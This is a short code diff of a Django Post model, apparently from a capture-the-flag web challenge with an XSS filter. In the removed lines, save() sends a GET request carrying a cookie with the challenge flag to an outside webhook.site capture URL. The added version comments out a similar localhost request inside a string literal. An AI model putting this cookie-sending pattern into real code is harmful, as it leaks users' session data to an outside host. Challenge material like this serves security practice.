@@ -20,11 +20,10 @@ class Post(models.Model):
 
     def save(self, *args, **kwargs):
         self.title = xss_filter(self.title)
-        url = "127.0.0.1:8000/board/"
-        URL = "https://webhook.site/7617c00b-22a6-454d-a546-05cc94ee6095"
+        """uuid = self.uuid
+        url = "http://127.0.0.1:8000/board/" + str(uuid) + "/"
         cookie = {'flag': 'GOTROOT{c00ki3_i3_g00d}'}
-        requests.get(URL, cookies=cookie)
-        #requests.get(url, cookies=cookie)
+        res = requests.get(url, cookies=cookie)"""
         super().save(*args, **kwargs)
 
 def xss_filter(title):
